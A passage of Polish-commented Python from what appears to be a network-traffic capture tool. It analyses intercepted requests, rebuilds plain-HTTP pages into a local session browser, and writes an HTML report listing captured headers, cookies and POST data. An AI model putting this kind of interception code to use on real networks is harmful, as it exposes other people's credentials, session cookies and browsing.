                        match_fingerprint = [request_fingerprint(all_requests[j + k]) for k in range(seq_len)]

                        if seq_fingerprint == match_fingerprint:
                            # Znaleziono powtarzającą się sekwencję
                            seq_urls = [all_requests[i + k]['url'] for k in range(seq_len)]

                            # Sprawdź czy już nie mamy tej sekwencji
                            if not any(set(seq_urls) == set(s['urls']) for s in found_sequences):
                                found_sequences.append({
                                    'urls': seq_urls,
                                    'length': seq_len,
                                    'first_occurrence': all_requests[i]['timestamp'],
                                    'second_occurrence': all_requests[j]['timestamp']
                                })

                                # Jeśli mamy wystarczająco dużo sekwencji, zakończ
                                if len(found_sequences) >= max_sequences:
                                    break

                    if len(found_sequences) >= max_sequences:
                        break

                if len(found_sequences) >= max_sequences:
                    break

            if found_sequences:
                print(f"\n[+] Wykryto {len(found_sequences)} powtarzających się sekwencji żądań:")
                for i, seq in enumerate(found_sequences):
                    print(f"\nSekwencja #{i + 1} (długość: {seq['length']})")
                    print(f"Pierwsze wystąpienie: {seq['first_occurrence']}")
                    print(f"Drugie wystąpienie: {seq['second_occurrence']}")
                    print("URL w sekwencji:")
                    for j, url in enumerate(seq['urls']):
                        print(f"  {j + 1}. {url}")

                patterns.append({
                    'type': 'repeated_sequences',
                    'description': 'Powtarzające się sekwencje żądań',
                    'sequences': found_sequences
                })
            else:
                print("\nNie wykryto powtarzających się sekwencji żądań.")

            # 2. Wykrywanie wzorców użycia API
            print("\nSzukanie wzorców użycia API...")

            api_patterns = {}
            api_keywords = ['/api/', '/v1/', '/v2/', '/v3/', '/rest/', '/graphql', '/gql', '/query']

            for url, requests in self.captured_data.items():
                # Sprawdź czy to może być URL API
                if any(keyword in url for keyword in api_keywords):
                    # Spróbuj wyekstrahować endpoint bez parametrów
                    endpoint = url.split('?')[0] if '?' in url else url

                    for req in requests:
                        method = req.get('method', 'GET')
                        key = f"{method} {endpoint}"

                        if key not in api_patterns:
                            api_patterns[key] = {
                                'count': 0,
                                'methods': set(),
                                'params': set(),
                                'timestamps': []
                            }

                        api_patterns[key]['count'] += 1
                        api_patterns[key]['methods'].add(method)

                        # Dodaj timestamp
                        timestamp = req.get('timestamp')
                        if timestamp:
                            api_patterns[key]['timestamps'].append(timestamp)

                        # Wyekstrahuj parametry URL
                        if '?' in url:
                            try:
                                query_params = url.split('?', 1)[1]
                                params = query_params.split('&')
                                for param in params:
                                    if '=' in param:
                                        param_name = param.split('=')[0]
                                        api_patterns[key]['params'].add(param_name)
                            except:
                                pass

            if api_patterns:
                # Posortuj według liczby wywołań
                sorted_api_patterns = sorted(api_patterns.items(), key=lambda x: x[1]['count'], reverse=True)

                print(f"\n[+] Wykryto {len(api_patterns)} wzorców API:")
                for i, (endpoint, data) in enumerate(sorted_api_patterns[:10]):  # Pokaż top 10
                    print(f"\n{i + 1}. {endpoint}")
                    print(f"   Liczba wywołań: {data['count']}")
                    print(f"   Metody: {', '.join(data['methods'])}")
                    if data['params']:
                        print(f"   Parametry: {', '.join(data['params'])}")

                if len(sorted_api_patterns) > 10:
                    print(f"\n... oraz {len(sorted_api_patterns) - 10} więcej endpointów API.")

                patterns.append({
                    'type': 'api_patterns',
                    'description': 'Wzorce użycia API',
                    'endpoints': [{
                        'endpoint': endpoint,
                        'count': data['count'],
                        'methods': list(data['methods']),
                        'params': list(data['params'])
                    } for endpoint, data in sorted_api_patterns[:20]]  # Ogranicz do top 20
                })
            else:
                print("\nNie wykryto wzorców API.")

            # 3. Wykrywanie schematu nawigacji
            print("\nSzukanie schematu nawigacji...")

            navigation_flows = []

            if len(all_requests) >= 3:  # Potrzebujemy co najmniej 3 żądania
                current_flow = []

                # Grupuj żądania według timestampa (z tolerancją 1 sekundy)
                grouped_requests = []
                current_group = [all_requests[0]]

                for i in range(1, len(all_requests)):
                    prev_req = all_requests[i - 1]
                    curr_req = all_requests[i]

                    try:
                        # Spróbuj przeliczyć różnicę czasu
                        prev_time = parse_timestamp(prev_req['timestamp'])
                        curr_time = parse_timestamp(curr_req['timestamp'])
                        time_diff = (curr_time - prev_time).total_seconds()

                        # Jeśli różnica czasu jest mała, dodaj do bieżącej grupy
                        if time_diff < 1.0:
                            current_group.append(curr_req)
                        else:
                            # W przeciwnym razie zakończ bieżącą grupę i rozpocznij nową
                            if current_group:
                                grouped_requests.append(current_group)
                            current_group = [curr_req]
                    except:
                        # Jeśli nie możemy porównać czasu, po prostu dodaj do bieżącej grupy
                        current_group.append(curr_req)

                # Dodaj ostatnią grupę
                if current_group:
                    grouped_requests.append(current_group)

                # Dla każdej grupy, weź tylko główne żądanie (ignoruj zasoby statyczne)
                navigation_sequence = []

                for group in grouped_requests:
                    # Wybierz żądanie, które prawdopodobnie jest głównym (nie statycznym zasobem)
                    main_requests = [req for req in group if not any(ext in req['url'].lower()
                                                                     for ext in
                                                                     ['.js', '.css', '.jpg', '.jpeg', '.png', '.gif',
                                                                      '.svg', '.woff', '.woff2'])]

                    if main_requests:
                        # Wybierz pierwszy z głównych żądań
                        navigation_sequence.append(main_requests[0])

                if navigation_sequence:
                    print(f"\n[+] Wykryty schemat nawigacji ({len(navigation_sequence)} kroków):")
                    for i, req in enumerate(navigation_sequence):
                        print(f"{i + 1}. {req['method']} {req['url']} ({req['timestamp']})")

                    patterns.append({
                        'type': 'navigation_flow',
                        'description': 'Schemat nawigacji użytkownika',
                        'steps': [{
                            'order': i + 1,
                            'method': req['method'],
                            'url': req['url'],
                            'timestamp': req['timestamp']
                        } for i, req in enumerate(navigation_sequence)]
                    })
                else:
                    print("\nNie wykryto wyraźnego schematu nawigacji.")
            else:
                print("\nZbyt mało danych, aby wykryć schemat nawigacji.")

            # 4. Podsumowanie
            if patterns:
                print(f"\n=== Podsumowanie wzorców ruchu ===")
                print(f"Wykryto łącznie {len(patterns)} rodzajów wzorców.")
            else:
                print("\nNie wykryto żadnych wyraźnych wzorców w analizowanych danych.")

            return patterns

        except Exception as e:
            print(f"Błąd podczas analizy wzorców ruchu: {e}")
            import traceback
            traceback.print_exc()
            return []

    def reconstruct_html_page(self, url, requests):
        """Rekonstruuje pełną stronę HTML na podstawie przechwyconych żądań

        Args:
            url (str): URL strony do rekonstrukcji
            requests (list): Lista przechwyconych żądań dla tego URL

        Returns:
            str: Zrekonstruowany kod HTML strony
        """
        if not requests:
            return f"<html><body><h1>Brak danych dla {url}</h1></body></html>"

        # Znajdź główne żądanie HTML
        main_request = None
        html_content = None

        for req in requests:
            # Sprawdź nagłówki aby znaleźć odpowiedź HTML
            headers = req.get('headers', {})
            if 'Content-Type' in headers and 'text/html' in headers['Content-Type'].lower():
                main_request = req
                # Sprawdź czy mamy treść odpowiedzi
                if 'response_content' in req:
                    html_content = req['response_content']
                break

        # Jeśli nie znaleziono żądania HTML, użyj pierwszego żądania
        if not main_request:
            main_request = requests[0]

        # Jeśli nie mamy treści HTML, wygeneruj zastępczą stronę
        if not html_content:
            base_domain = url.split('://', 1)[1].split('/', 1)[0] if '://' in url else url

            html_content = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <title>{base_domain}</title>
                <style>
                    body {{ font-family: Arial, sans-serif; margin: 0; padding: 20px; }}
                    .header {{ background: #f5f5f5; padding: 15px; border-bottom: 1px solid #ddd; }}
                    .content {{ padding: 20px; }}
                    .request-info {{ margin-bottom: 20px; padding: 10px; border: 1px solid #eee; }}
                    .resource {{ margin: 5px 0; padding: 8px; background: #f9f9f9; border-radius: 4px; }}
                    .http {{ color: #e74c3c; }}
                    .https {{ color: #27ae60; }}
                </style>
            </head>
            <body>
                <div class="header">
                    <h2>Zrekonstruowana strona: {url}</h2>
                    <p>Ta strona została zrekonstruowana na podstawie przechwyconych danych.</p>
                </div>
                <div class="content">
                    <div class="request-info">
                        <h3>Informacje o żądaniu</h3>
                        <p><strong>URL:</strong> {url}</p>
                        <p><strong>Metoda:</strong> {main_request.get('method', 'GET')}</p>
                        <p><strong>Czas:</strong> {main_request.get('timestamp', 'nieznany')}</p>
                    </div>
            """

            # Dodaj informacje o zasobach
            resource_count = 0
            html_content += "<h3>Powiązane zasoby</h3>"

            for req in requests:
                if req != main_request:
                    req_url = req.get('url', url)
                    protocol = "HTTPS" if req_url.startswith("https://") else "HTTP"
                    protocol_class = "https" if protocol == "HTTPS" else "http"

                    html_content += f"""
                    <div class="resource">
                        <span class="{protocol_class}">{protocol}</span> {req.get('method', 'GET')} {req_url}
                    </div>
                    """
                    resource_count += 1

                    # Ogranicz liczbę wyświetlanych zasobów
                    if resource_count >= 20:
                        html_content += f"<p>... oraz {len(requests) - 21} więcej zasobów</p>"
                        break

            html_content += """
                </div>
            </body>
            </html>
            """

        # Dodaj skrypt do przechwytywania kliknięć i nawigacji
        inject_script = """
        <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Przechwytuj kliknięcia
            document.addEventListener('click', function(e) {
                // Sprawdź czy kliknięto link
                let target = e.target;
                while (target && target.tagName !== 'A') {
                    target = target.parentElement;
                }

                if (target && target.href) {
                    e.preventDefault();

                    // Wyślij informację o kliknięciu do rodzica
                    window.parent.postMessage({
                        type: 'linkClick',
                        url: target.href
                    }, '*');
                }
            });

            // Oznacz wszystkie linki
            const links = document.querySelectorAll('a');
            links.forEach(link => {
                link.style.border = '1px dashed #3498db';
                link.style.padding = '2px 4px';
                link.setAttribute('title', 'Kliknij, aby przejść do: ' + link.href);
            });
        });
        </script>
        """

        # Dodaj skrypt do kodu HTML
        if '</body>' in html_content:
            html_content = html_content.replace('</body>', inject_script + '</body>')
        elif '</html>' in html_content:
            html_content = html_content.replace('</html>', inject_script + '</body></html>')
        else:
            html_content += inject_script

        return html_content

    def save_reconstructed_page(self, url, html_content, output_dir="reconstructed_pages"):
        """Zapisuje zrekonstruowaną stronę HTML do pliku

        Args:
            url (str): URL strony
            html_content (str): Treść HTML
            output_dir (str): Katalog docelowy

        Returns:
            str: Ścieżka do zapisanego pliku
        """
        import os

        # Utwórz katalog jeśli nie istnieje
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)

        # Generuj nazwę pliku na podstawie URL
        base_domain = url.split('://', 1)[1].split('/', 1)[0] if '://' in url else url
        path = url.split('://', 1)[1].split('/', 1)[1] if '://' in url and '/' in url.split('://', 1)[1] else ""

        # Usuń znaki niedozwolone w nazwach plików
        for char in [':', '?', '&', '=', ' ', '#']:
            path = path.replace(char, '_')

        # Ogranicz długość nazwy pliku
        if len(path) > 50:
            path = path[:50]

        # Generuj nazwę pliku
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{base_domain}_{path}_{timestamp}.html"

        # Zapisz plik
        filepath = os.path.join(output_dir, filename)
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(html_content)

        return filepath

    def interactive_session_browsing(self):
        """Umożliwia interaktywne przeglądanie zapisanych stron z nawigacją między nimi"""
        if not self.captured_data:
            print("Brak danych do wyświetlenia. Najpierw przechwytaj ruch lub wczytaj dane z pliku.")
            return False

        try:
            import os
            import json
            from datetime import datetime

            # Generuj unikalną nazwę dla sesji przeglądania
            session_id = f"session_{datetime.now().strftime('%Y%m%d%H%M%S')}"
            session_dir = f"browser_sessions/{session_id}"

            # Utwórz katalogi do przechowywania zrekonstruowanych stron
            os.makedirs(session_dir, exist_ok=True)

            # Utwórz indeks stron dla bieżącej sesji
            page_index = {}
            url_to_file_map = {}

            print("\nPrzygotowywanie danych do przeglądania interaktywnego...")

            # Przygotuj wszystkie dostępne strony (najpierw HTTP, potem HTTPS)
            all_urls = []
            http_urls = [url for url in self.captured_data.keys() if url.startswith('http://')]
            https_urls = [url for url in self.captured_data.keys() if url.startswith('https://')]
            all_urls = http_urls + https_urls

            if not all_urls:
                print("Nie znaleziono przechwyconych stron.")
                return False

            # Rekonstruuj wszystkie strony HTTP i przygotuj zastępcze strony dla HTTPS
            for i, url in enumerate(all_urls):
                is_https = url.startswith('https://')
                requests = self.captured_data[url]

                print(f"Przygotowywanie {i + 1}/{len(all_urls)}: {url}")

                # Rekonstruuj stronę
                if is_https:
                    # Dla HTTPS tworzymy placeholder z informacją o szyfrowaniu
                    html_content = self._generate_https_placeholder(url, requests)
                else:
                    # Dla HTTP rekonstruujemy pełną stronę
                    html_content = self.reconstruct_html_page(url, requests)

                # Dodaj skrypty do obsługi nawigacji między stronami
                html_content = self._add_navigation_scripts(html_content, url, session_id)

                # Generuj nazwę pliku dla strony
                filename = self._generate_filename_from_url(url)
                filepath = os.path.join(session_dir, filename)

                # Zapisz stronę do pliku
                with open(filepath, 'w', encoding='utf-8', errors='ignore') as f:
                    f.write(html_content)

                # Dodaj do indeksu
                page_index[url] = {
                    'filepath': filepath,
                    'is_https': is_https,
                    'timestamp': requests[0].get('timestamp', 'unknown') if requests else 'unknown',
                    'request_count': len(requests)
                }

                url_to_file_map[url] = filepath

            # Zapisz indeks sesji
            with open(os.path.join(session_dir, 'session_index.json'), 'w') as f:
                json.dump({
                    'session_id': session_id,
                    'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'page_count': len(page_index),
                    'pages': page_index
                }, f, indent=2)

            # Uruchom przeglądarkę z indeksem stron
            self._launch_session_browser(session_dir, url_to_file_map)
            return True

        except Exception as e:
            print(f"Błąd podczas tworzenia przeglądarki interaktywnej: {e}")
            import traceback
            traceback.print_exc()
            return False

    def create_simple_browser_fallback(self):
        """Tworzy prostą statyczną przeglądarkę przechwyconych danych jako fallback, gdy interaktywna przeglądarka nie działa

        Returns:
            bool: True jeśli tworzenie przebiegło pomyślnie, False w przeciwnym wypadku
        """
        if not self.captured_data:
            print("Brak danych do wyświetlenia.")
            return False

        try:
            # Generuj nazwę pliku
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"captured_data_{timestamp}.html"

            # Utwórz HTML
            html = """<!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Przechwycone dane ruchu sieciowego</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
            h1, h2, h3 { color: #2c3e50; }
            .url-item { margin-bottom: 10px; padding: 10px; border: 1px solid #ddd; border-radius: 5px; }
            .url-item h3 { margin-top: 0; }
            .http { color: green; }
            .https { color: blue; }
            .request-details { margin-left: 20px; padding: 10px; border-left: 3px solid #eee; margin-bottom: 10px; }
            .request-details pre { background: #f9f9f9; padding: 10px; overflow-x: auto; }
            .cookie-table, .header-table { width: 100%; border-collapse: collapse; margin: 10px 0; }
            .cookie-table th, .cookie-table td, .header-table th, .header-table td { 
                padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }
            .toggle-btn { 
                background: #3498db; color: white; border: none; padding: 5px 10px; 
                border-radius: 3px; cursor: pointer; margin-top: 5px; }
            .toggle-btn:hover { background: #2980b9; }
            .hidden { display: none; }
            .badge {
                display: inline-block;
                padding: 2px 5px;
                border-radius: 3px;
                font-size: 12px;
                margin-right: 5px;
                color: white;
            }
            .http-badge { background-color: #e74c3c; }
            .https-badge { background-color: #27ae60; }
        </style>
        <script>
            function toggleDetails(id) {
                const element = document.getElementById(id);
                if (element.classList.contains('hidden')) {
                    element.classList.remove('hidden');
                } else {
                    element.classList.add('hidden');
                }

                // Zmień tekst przycisku
                const button = document.querySelector(`button[onclick="toggleDetails('${id}')"]`);
                if (button) {
                    button.textContent = element.classList.contains('hidden') ? 'Pokaż szczegóły' : 'Ukryj szczegóły';
                }
            }
        </script>
    </head>
    <body>
        <h1>Przechwycone dane ruchu sieciowego</h1>
        <p>Data wygenerowania: """ + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + """</p>

        <div>
            <h2>Statystyki</h2>
            <p>Liczba przechwyconych URL: """ + str(len(self.captured_data)) + """</p>
            <p>Łączna liczba żądań: """ + str(sum(len(reqs) for reqs in self.captured_data.values())) + """</p>
        </div>

        <h2>Przechwycone URL</h2>
    """

            # Dodaj każdy URL i jego żądania
            for i, (url, requests) in enumerate(self.captured_data.items()):
                # Określ protokół
                protocol = "HTTPS" if url.startswith("https://") else "HTTP"
                protocol_class = "https-badge" if protocol == "HTTPS" else "http-badge"

                html += f"""
        <div class="url-item">
            <h3>
                <span class="badge {protocol_class}">{protocol}</span>
                {url}
            </h3>
            <p>Liczba żądań: {len(requests)}</p>
            <button class="toggle-btn" onclick="toggleDetails('url-{i}')">Pokaż szczegóły</button>

            <div id="url-{i}" class="hidden">
    """

                # Dodaj szczegóły każdego żądania
                for j, req in enumerate(requests):
                    method = req.get('method', 'GET')
                    timestamp = req.get('timestamp', 'nieznany')

                    html += f"""
                <div class="request-details">
                    <h4>Żądanie #{j + 1} - {method} ({timestamp})</h4>
    """

                    # Dodaj nagłówki
                    headers = req.get('headers', {})
                    if headers:
                        html += """
                    <h5>Nagłówki</h5>
                    <table class="header-table">
                        <tr>
                            <th>Nagłówek</th>
                            <th>Wartość</th>
                        </tr>
    """

                        for header, value in headers.items():
                            html += f"""
                        <tr>
                            <td>{header}</td>
                            <td>{value}</td>
                        </tr>"""

                        html += """
                    </table>
    """

                    # Dodaj ciasteczka
                    cookies = req.get('cookies', {})
                    if cookies:
                        html += """
                    <h5>Ciasteczka</h5>
                    <table class="cookie-table">
                        <tr>
                            <th>Nazwa</th>
                            <th>Wartość</th>
                        </tr>
    """

                        for name, value in cookies.items():
                            html += f"""
                        <tr>
                            <td>{name}</td>
                            <td>{value}</td>
                        </tr>"""

                        html += """
                    </table>
    """

                    # Dodaj dane POST
                    if 'post_data' in req and req['post_data']:
                        html += f"""
                    <h5>Dane POST</h5>
                    <pre>{req['post_data']}</pre>
    """

                    html += """
                </div>
    """

                html += """
            </div>
        </div>
    """

            # Zakończ HTML
            html += """
    </body>
    </html>
    """

            # Zapisz plik
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(html)

            print(f"Utworzono statyczną przeglądarkę w pliku: {filename}")

            # Spróbuj otworzyć w przeglądarce
            open_browser = input("Czy chcesz otworzyć stronę w przeglądarce? (t/n): ").lower()
            if open_browser in ['t', 'tak']:
                try:
                    import webbrowser
                    webbrowser.open('file://' + os.path.abspath(filename))
                    print("Strona została otwarta w przeglądarce.")
                except Exception as e:
                    print(f"Nie udało się otworzyć przeglądarki: {e}")
                    print(f"Możesz ręcznie otworzyć plik: {filename}")

            return True

        except Exception as e:
            print(f"Błąd podczas tworzenia statycznej przeglądarki: {e}")
            import traceback
            traceback.print_exc()
            return False

    def _generate_https_placeholder(self, url, requests):
        """Generuje stronę placeholder dla zaszyfrowanych stron HTTPS"""
        base_domain = url.split('://', 1)[1].split('/', 1)[0] if '://' in url else url

        html = f"""<!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>{base_domain} (HTTPS)</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 0; padding: 20px; text-align: center; }}
            .https-info {{ max-width: 600px; margin: 50px auto; padding: 20px; 
                        border: 1px solid #ccc; border-radius: 5px; background: #f9f9f9; }}
            h2 {{ color: #2196F3; }}
            .lock-icon {{ font-size: 48px; color: #2196F3; margin-bottom: 20px; }}
            .resource-list {{ text-align: left; margin-top: 20px; }}
            .resource {{ padding: 5px; border-bottom: 1px solid #eee; }}
            .nav-bar {{ background: #333; color: white; padding: 10px; display: flex; align-items: center; }}
            .nav-button {{ margin-right: 10px; padding: 5px 10px; background: #555; border: none; color: white; cursor: pointer; }}
            .url-display {{ flex-grow: 1; padding: 5px 10px; background: #444; border-radius: 3px; }}
        </style>
    </head>
    <body>
        <div class="nav-bar">
            <button class="nav-button" id="backBtn">◀</button>
            <button class="nav-button" id="forwardBtn">▶</button>
            <button class="nav-button" id="homeBtn">🏠</button>
            <div class="url-display">{url}</div>
        </div>

        <div class="https-info">
            <div class="lock-icon">🔒</div>
            <h2>Połączenie HTTPS</h2>
            <p>Ta strona używa szyfrowanego połączenia HTTPS. Nie jest możliwe wyświetlenie jej rzeczywistej zawartości 
               w przeglądarce sesji, ponieważ dane zostały zaszyfrowane.</p>
            <p>Poniżej widoczne są przechwycone zasoby z tej strony.</p>
            <hr>
            <p><strong>URL:</strong> {url}</p>
            <p><strong>Liczba zarejestrowanych żądań:</strong> {len(requests)}</p>

            <div class="resource-list">
                <h3>Przechwycone zasoby:</h3>
    """

        # Dodaj listę zasobów (maksymalnie 20)
        resource_count = 0
        for req in requests:
            method = req.get('method', 'GET')
            timestamp = req.get('timestamp', 'unknown')

            html += f'<div class="resource">{method} - {timestamp}</div>\n'
            resource_count += 1

            if resource_count >= 20 and len(requests) > 20:
                html += f'<div class="resource">... oraz {len(requests) - 20} więcej zasobów</div>\n'
                break

        html += """
            </div>
        </div>
    </body>
    </html>
    """
        return html

    def _generate_filename_from_url(self, url):
        """Generuje odpowiednią nazwę pliku na podstawie URL"""
        # Wyodrębnij domenę i ścieżkę
        if '://' in url:
            parts = url.split('://', 1)
            protocol = parts[0]
            domain_path = parts[1]
        else:
            protocol = 'http'
            domain_path = url

        # Rozdziel domenę i ścieżkę
        if '/' in domain_path:
            domain_parts = domain_path.split('/', 1)
            domain = domain_parts[0]
            path = domain_parts[1]
        else:
            domain = domain_path
            path = ''

        # Usuń parametry URL (wszystko po ?)
        if '?' in path:
            path = path.split('?', 1)[0]

        # Usuń nielegalne znaki
        for char in [':', '?', '&', '=', '#', '*', '"', "'", '<', '>', '|']:
            path = path.replace(char, '_')

        # Ogranicz długość ścieżki
        if len(path) > 50:
            path = path[:50]

        # Dodaj rozszerzenie .html
        if not path:
            path = 'index'

        # Unikalna nazwa bazująca na domenie i ścieżce
        unique_id = str(hash(url) % 10000).zfill(4)  # 4-cyfrowy identyfikator
        filename = f"{domain.replace('.', '_')}_{path.replace('/', '_')}_{unique_id}.html"

        return filename

    def _add_navigation_scripts(self, html_content, current_url, session_id):
        """Dodaje skrypty JavaScript do nawigacji między stronami"""
        nav_script = f"""
    <script>
    // Dane sesji
    const sessionId = "{session_id}";
    const currentUrl = "{current_url}";

    // Historia przeglądania
    let sessionHistory = [];
    let currentHistoryPosition = -1;

    // Załaduj historię z localStorage jeśli istnieje
    function loadHistory() {{
        const savedHistory = localStorage.getItem(`browser_session_${{sessionId}}`);
        if (savedHistory) {{
            try {{
                const historyData = JSON.parse(savedHistory);
                sessionHistory = historyData.history || [];
                currentHistoryPosition = historyData.position || -1;
            }} catch (e) {{
                console.error('Błąd wczytywania historii:', e);
                sessionHistory = [];
                currentHistoryPosition = -1;
            }}
        }}

        // Jeśli bieżący URL nie jest w historii lub rozpoczynamy nową sesję
        if (sessionHistory.length === 0 || sessionHistory[currentHistoryPosition] !== currentUrl) {{
            // Jeśli jesteśmy w środku historii, usuń wszystko po bieżącej pozycji
            if (currentHistoryPosition >= 0 && currentHistoryPosition < sessionHistory.length - 1) {{
                sessionHistory = sessionHistory.slice(0, currentHistoryPosition + 1);
            }}

            // Dodaj bieżący URL do historii
            sessionHistory.push(currentUrl);
            currentHistoryPosition = sessionHistory.length - 1;
            saveHistory();
        }}

        updateNavButtons();
    }}

    // Zapisz historię do localStorage
    function saveHistory() {{
        try {{
            localStorage.setItem(`browser_session_${{sessionId}}`, JSON.stringify({{
                history: sessionHistory,
                position: currentHistoryPosition
            }}));
        }} catch (e) {{
            console.error('Błąd zapisywania historii:', e);
        }}
    }}

    // Aktualizuj stan przycisków nawigacji
    function updateNavButtons() {{
        const backBtn = document.getElementById('backBtn');
        const forwardBtn = document.getElementById('forwardBtn');

        if (backBtn) {{
            backBtn.disabled = currentHistoryPosition <= 0;
        }}

        if (forwardBtn) {{
            forwardBtn.disabled = currentHistoryPosition >= sessionHistory.length - 1;
        }}
    }}

    // Obsługa nawigacji wstecz
    function goBack() {{
        if (currentHistoryPosition > 0) {{
            currentHistoryPosition--;
            const url = sessionHistory[currentHistoryPosition];
            saveHistory();
            window.location.href = url.replace('http://', 'file:///{session_id}/').replace('https://', 'file:///{session_id}/');
        }}
    }}

    // Obsługa nawigacji do przodu
    function goForward() {{
        if (currentHistoryPosition < sessionHistory.length - 1) {{
            currentHistoryPosition++;
            const url = sessionHistory[currentHistoryPosition];
            saveHistory();
            window.location.href = url.replace('http://', 'file:///{session_id}/').replace('https://', 'file:///{session_id}/');
        }}
    }}

    // Przechwytuj kliknięcia na linki
    document.addEventListener('DOMContentLoaded', function() {{
        // Inicjalizacja historii
        loadHistory();

        // Obsługa przycisków nawigacji
        const backBtn = document.getElementById('backBtn');
        const forwardBtn = document.getElementById('forwardBtn');
        const homeBtn = document.getElementById('homeBtn');

        if (backBtn) backBtn.addEventListener('click', goBack);
        if (forwardBtn) forwardBtn.addEventListener('click', goForward);
        if (homeBtn) homeBtn.addEventListener('click', function() {{
            window.location.href = 'session_index.html';
        }});

        // Przechwytuj kliknięcia na linki
        document.addEventListener('click', function(e) {{
            let target = e.target;
            while (target && target.tagName !== 'A') {{
                target = target.parentElement;
            }}

            if (target && target.href) {{
                e.preventDefault();

                // Dodaj bieżący URL do historii
                if (currentHistoryPosition >= 0 && currentHistoryPosition < sessionHistory.length - 1) {{
                    sessionHistory = sessionHistory.slice(0, currentHistoryPosition + 1);
                }}

                const clickedUrl = target.href;
                sessionHistory.push(clickedUrl);
                currentHistoryPosition = sessionHistory.length - 1;
                saveHistory();

                // Nawiguj do URL
                if (clickedUrl.startsWith('http://') || clickedUrl.startsWith('https://')) {{
                    // Przekieruj do odpowiedniego pliku w sesji
                    const mappedUrl = clickedUrl.replace('http://', 'file:///{session_id}/').replace('https://', 'file:///{session_id}/');
                    window.location.href = mappedUrl;
                }} else {{
                    // Bezpośredni link lokalny
                    window.location.href = clickedUrl;
                }}
            }}
        }});
    }});
    </script>
    """

        # Dodaj skrypt nawigacji przed </body> lub </html>
        if '</body>' in html_content:
            html_content = html_content.replace('</body>', nav_script + '</body>')
        elif '</html>' in html_content:
            html_content = html_content.replace('</html>', nav_script + '</body></html>')
        else:
            html_content += nav_script

        return html_content

    def _launch_session_browser(self, session_dir, url_to_file_map):
        """Uruchamia przeglądarkę z indeksem stron sesji"""
        # Utwórz stronę indeksu
        index_html = self._create_session_index_page(session_dir, url_to_file_map)

        # Zapisz indeks do pliku
        index_path = os.path.join(session_dir, 'session_index.html')
        with open(index_path, 'w', encoding='utf-8') as f:
            f.write(index_html)

        # Uruchom przeglądarkę
        print(f"\nSesja przeglądania została przygotowana w: {session_dir}")

        try:
            import webbrowser
            webbrowser.open('file://' + os.path.abspath(index_path))
            print("Strona indeksu została otwarta w przeglądarce.")
        except Exception as e:
            print(f"Nie udało się automatycznie otworzyć przeglądarki: {e}")
            print(f"Możesz ręcznie otworzyć plik: {index_path}")

        return True

    def _create_session_index_page(self, session_dir, url_to_file_map):
        """Tworzy stronę indeksu sesji przeglądania"""
        # Wczytaj indeks sesji
        try:
            with open(os.path.join(session_dir, 'session_index.json'), 'r') as f:
                session_data = json.load(f)
        except:
            session_data = {
                'session_id': os.path.basename(session_dir),
                'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'page_count': len(url_to_file_map),
                'pages': {}
            }

        # Grupuj strony według domen
        domains = {}
        for url, file_path in url_to_file_map.items():
            # Wyodrębnij domenę
            domain = url.split('://', 1)[1].split('/', 1)[0] if '://' in url else url

            if domain not in domains:
                domains[domain] = []

            # Dodaj informacje o stronie
            page_info = session_data.get('pages', {}).get(url, {})
            domains[domain].append({
                'url': url,
                'file_path': os.path.basename(file_path),
                'is_https': url.startswith('https://'),
                'timestamp': page_info.get('timestamp', 'unknown'),
                'request_count': page_info.get('request_count', 0)
            })

        # Sortuj domeny według liczby stron (malejąco)
        sorted_domains = sorted(domains.items(), key=lambda x: len(x[1]), reverse=True)

        # Generuj HTML
        html = f"""<!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Sesja przeglądania - {session_data['session_id']}</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 0; padding: 0; background: #f5f5f5; }}
            .container {{ max-width: 1200px; margin: 0 auto; padding: 20px; }}
            .header {{ background: #333; color: white; padding: 20px; margin-bottom: 20px; }}
            .domain-card {{ background: white; margin-bottom: 20px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); overflow: hidden; }}
            .domain-header {{ background: #4CAF50; color: white; padding: 10px 20px; font-weight: bold; }}
            .page-list {{ padding: 10px 20px; }}
            .page-item {{ padding: 10px; border-bottom: 1px solid #eee; display: flex; align-items: center; }}
            .page-item:last-child {{ border-bottom: none; }}
            .page-item:hover {{ background: #f9f9f9; }}
            .page-link {{ text-decoration: none; color: #333; flex-grow: 1; }}
            .page-link:hover {{ text-decoration: underline; }}
            .protocol-badge {{ display: inline-block; padding: 2px 5px; border-radius: 3px; font-size: 12px; margin-right: 10px; color: white; }}
            .http {{ background: #E91E63; }}
            .https {{ background: #2196F3; }}
            .timestamp {{ font-size: 12px; color: #777; margin-right: 10px; }}
            .request-count {{ font-size: 12px; background: #eee; padding: 2px 5px; border-radius: 3px; }}
            .stats {{ background: white; padding: 15px; border-radius: 5px; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }}
            .stats-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }}
            .stat-item {{ text-align: center; padding: 15px; }}
            .stat-value {{ font-size: 24px; font-weight: bold; color: #4CAF50; margin-bottom: 5px; }}
            .stat-label {{ font-size: 14px; color: #777; }}
            .search-box {{ padding: 10px; margin-bottom: 20px; }}
            .search-input {{ width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; }}
        </style>
    </head>
    <body>
        <div class="header">
            <h1>Sesja przeglądania</h1>
            <p>Data utworzenia: {session_data['created_at']}</p>
        </div>

        <div class="container">
            <div class="stats">
                <div class="stats-grid">
                    <div class="stat-item">
                        <div class="stat-value">{session_data['page_count']}</div>
                        <div class="stat-label">Przechwycone strony</div>
                    </div>
